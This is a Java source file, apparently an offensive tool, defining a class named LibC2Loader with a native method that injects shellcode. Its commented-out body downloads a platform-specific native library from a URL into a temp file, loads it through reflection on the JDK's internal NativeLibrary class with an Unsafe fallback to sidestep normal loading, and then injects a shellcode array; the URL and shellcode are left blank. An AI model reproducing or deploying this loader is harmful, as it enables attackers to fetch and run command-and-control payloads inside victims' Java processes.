public class LibC2Loader {

    public native void inject(byte[] shellcode);

//    public void test() throws Throwable {
//
//        BufferedInputStream bufferedInputStream = null;
//        FileOutputStream stream = null;
//        String os;
//        String url = "";
//
//        try{
//            String suffix;
//            os = System.getProperty("os.name").toLowerCase();
//
//            if (os.contains("windows")) {
//                suffix = ".dll";
//            }else if (os.contains("mac")) {
//                suffix = ".dylib";
//            }else {
//                suffix = ".so";
//            }
//            bufferedInputStream = new BufferedInputStream(new URL(url).openStream());
//            File file = File.createTempFile("demo", suffix);
//            stream = new FileOutputStream(file);
//            final byte data[] = new byte[8192];
//            int count;
//            while((count = bufferedInputStream.read(data)) > 0)
//                stream.write(data, 0, count);
//            load(file.getAbsolutePath());
//
//            byte[] shellcode = new byte[]{
//
//            };
//            inject(shellcode);
//        }catch (Exception e){
//
//        }finally {
//            if(bufferedInputStream != null){
//                try {
//                    bufferedInputStream.close();
//                } catch (IOException e) {
//                    e.printStackTrace();
//                }
//            }
//            if(stream != null){
//                try {
//                    stream.close();
//                } catch (IOException e) {
//                    e.printStackTrace();
//                }
//            }
//        }
//    }
//
//    private void load(String t) throws Exception {
//        Object o;
//        Class a = Class.forName("java.lang.ClassLoader$NativeLibrary");
//        try {
//            java.lang.reflect.Constructor c = a.getDeclaredConstructor(new Class[]{Class.class,String.class,boolean.class});
//            c.setAccessible(true);
//            o = c.newInstance(Class.class,t,true);
//        }catch (Exception e){
//            Class u = Class.forName("sun.misc.Unsafe");
//            java.lang.reflect.Constructor<?> c = u.getDeclaredConstructor();
//            c.setAccessible(true);
//            sun.misc.Unsafe un = (sun.misc.Unsafe)c.newInstance();
//            o =  un.allocateInstance(a);
//        }
//        java.lang.reflect.Method method = o.getClass().getDeclaredMethod("load", String.class, boolean.class);
//        method.setAccessible(true);
//        method.invoke(o, t, false);
//    }
//
//
//    public static void main(String[] args) throws Throwable {
//        LibC2Loader t = new LibC2Loader();
//        t.test();
//    }
}